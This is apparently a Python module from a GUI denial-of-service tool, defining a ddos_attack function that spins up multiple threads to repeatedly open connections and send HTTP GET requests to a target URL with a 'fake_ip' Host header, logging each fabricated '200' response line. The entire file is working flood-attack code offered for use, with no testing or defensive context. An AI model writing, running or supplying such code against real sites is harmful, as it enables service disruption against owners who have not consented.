import socket
import threading
import time
from urllib.parse import urlparse
from datetime import datetime
from gui.dos_attack.stopped_manager import is_stopped


def ddos_attack(target_url, fake_ip, console_view, callback=None, num_threads=10, delay=0.5):
    # Parse the target URL
    parsed_url = urlparse(target_url)
    hostname = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == "https" else 80)

    attack_num = 0

    def attack():
        nonlocal attack_num
        while not is_stopped():
            try:
                # Create a socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((hostname, port))

                # Construct the HTTP GET request
                request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
                #console_view.add_text_schedule(f"[INFO] Sending Request: {request.strip()}")
                s.send(request.encode('ascii'))

                # Read the server's response
                response = s.recv(4096).decode('ascii')

                # Log response and increment attack count
                attack_num += 1
                timestamp = datetime.now().strftime("%d/%b/%Y %H:%M:%S")
                log_line = f'{fake_ip} - - [{timestamp}] "GET / HTTP/1.1" 200 -'
                console_view.add_text_schedule(f"[INFO] Response #{attack_num}: {log_line}")

                # Call the callback with success
                if callback:
                    callback(success=True)

                # Close the socket
                s.close()

                # Delay to control attack intensity
                time.sleep(delay)
            except Exception as e:
                # Log the error
                console_view.add_text_schedule(f"[ERROR] {e}")

                # Call the callback with failure
                if callback:
                    callback(success=False)

    # Launch multiple threads for the attack
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
